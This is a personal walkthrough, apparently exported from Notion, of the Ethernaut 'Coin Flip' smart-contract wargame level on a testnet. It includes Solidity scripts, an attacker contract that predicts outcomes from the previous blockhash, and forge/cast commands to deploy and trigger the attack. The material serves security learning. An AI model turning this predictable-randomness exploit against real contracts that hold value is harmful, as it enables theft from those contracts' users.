---
title: "Coin Flip"
date: "2024-01-31"
lastmod: "2024-02-12T14:39:00.000Z"
draft: false
difficulty: "⭐⭐"
prev: "Fal1out-eb9fe61a4da943248fa363e1918dd9f6"
weight: 3
state: "Terminé"
level-url: "https://ethernaut.openzeppelin.com/level/3"
next: "Telephone-8b2069f0beb045b69400a28665c1d56c"
type: "docs"
NOTION_METADATA:
  object: "page"
  id: "c27578d4-0d2f-427d-968d-5623d7000dab"
  created_time: "2024-02-12T13:39:00.000Z"
  last_edited_time: "2024-02-12T14:39:00.000Z"
  created_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  last_edited_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  cover: null
  icon:
    type: "external"
    external:
      url: "https://ethernaut.openzeppelin.com/imgs/BigLevel3.svg"
  parent:
    type: "database_id"
    database_id: "cb6853ff-d731-4d6a-9080-6c8efeec5b1c"
  archived: false
  properties:
    difficulty:
      id: "IAjo"
      type: "select"
      select:
        id: "2fa50c76-9c63-4f19-b03a-b8fb1889da7c"
        name: "⭐⭐"
        color: "blue"
    prev:
      id: "LLP%5C"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "Fal1out-eb9fe61a4da943248fa363e1918dd9f6"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Fal1out-eb9fe61a4da943248fa363e1918dd9f6"
          href: null
    date:
      id: "Y%40Gy"
      type: "date"
      date:
        start: "2024-01-31"
        end: null
        time_zone: null
    weight:
      id: "%5Dyda"
      type: "number"
      number: 3
    state:
      id: "f%40ps"
      type: "status"
      status:
        id: "abb7fad3-add1-4b13-946c-06bff36598bf"
        name: "Terminé"
        color: "green"
    level-url:
      id: "juZs"
      type: "url"
      url: "https://ethernaut.openzeppelin.com/level/3"
    next:
      id: "pocA"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "Telephone-8b2069f0beb045b69400a28665c1d56c"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Telephone-8b2069f0beb045b69400a28665c1d56c"
          href: null
    type:
      id: "s%7DKc"
      type: "select"
      select:
        id: "OnJy"
        name: "docs"
        color: "default"
    title:
      id: "title"
      type: "title"
      title:
        - type: "text"
          text:
            content: "Coin Flip"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Coin Flip"
          href: null
  url: "https://www.notion.so/Coin-Flip-c27578d40d2f427d968d5623d7000dab"
  public_url: null
UPDATE_TIME: "2024-02-14T14:48:58.231Z"

---
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/katex.min.css" integrity="sha384-bYdxxUwYipFNohQlHt0bjN/LCpueqWz13HufFEV1SUatKs1cm4L6fFgCi1jT643X" crossorigin="anonymous">


This is a coin 
flipping game where you need to build up your winning streak by guessing
 the outcome of a coin flip. To complete this level you'll need to use 
your psychic abilities to guess the correct outcome 10 times in a row.


Things that might help

- See the ["?"](https://ethernaut.openzeppelin.com/help) page above in the top right corner menu, section "Beyond the console"

Here is the first version of my solution:


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";


interface CoinFlip {
  function consecutiveWins() external returns (uint256);
  function flip(bool _guess) external returns (bool);
}

contract POC is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address addr = vm.envAddress("INSTANCE_03");
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

        vm.startBroadcast(deployerPrivateKey);
        CoinFlip instance = CoinFlip(addr);

        for (uint i = 0; i < 10; i++) {
          uint256 blockValue = uint256(blockhash(block.number - 1));
          uint coinFlip = blockValue / FACTOR;
          bool side = coinFlip == 1 ? true : false;
          instance.flip(side);
          console.logUint(instance.consecutiveWins());
       }


        vm.stopBroadcast();
    }
}
```


It doesn’t work because block.number doesn’t change between executionn of the loop.


[link_preview](https://github.com/foundry-rs/foundry/issues/5840)


It seems that theire is on way to do this so let’s go by hand for now…


Here is the forge script:


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";


interface CoinFlip {
  function consecutiveWins() external returns (uint256);
  function flip(bool _guess) external returns (bool);
}

contract POC is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address addr = vm.envAddress("INSTANCE_03");
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

        vm.startBroadcast(deployerPrivateKey);
        CoinFlip instance = CoinFlip(addr);

        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        instance.flip(side);
        console.logUint(instance.consecutiveWins());


        vm.stopBroadcast();
    }
}
```


Actually this is too complecated. So let’s build a contract that will do th attack for us with check in it so that we are sure to get a valid result. 


here is my attacker contract:


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface CoinFlip {
  function consecutiveWins() external returns (uint256);
  function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttack {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  CoinFlip coinFlipTarget;

  constructor(address instanceAdrress) {
    coinFlipTarget = CoinFlip(instanceAdrress);
    consecutiveWins = 0;
  }

  function attack() public {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    if (lastHash != blockValue) {
      lastHash = blockValue;
      uint256 coinFlip = blockValue / FACTOR;
      bool side = coinFlip == 1 ? true : false;
      coinFlipTarget.flip(side);
      consecutiveWins++;
    }
  }
}
```


Let’s deploy this contract :


```solidity
forge create --rpc-url $SEPOLIA_RPC_URL --private-key $PRIVATE_KEY src/03.sol:CoinFlipAttack --constructor-args $INSTANCE_03
```


Now we can call our `attack()` function with cast send:


```solidity
cast send $ATTACKER_03 --rpc-url $SEPOLIA_RPC_URL --private-key $PRIVATE_KEY "attack()"
```


We can also look up the current consecutive wins on the attacked contract using the following cast command:


```solidity
cast call $INSTANCE_03 --rpc-url $SEPOLIA_RPC_URL "consecutiveWins()"
```

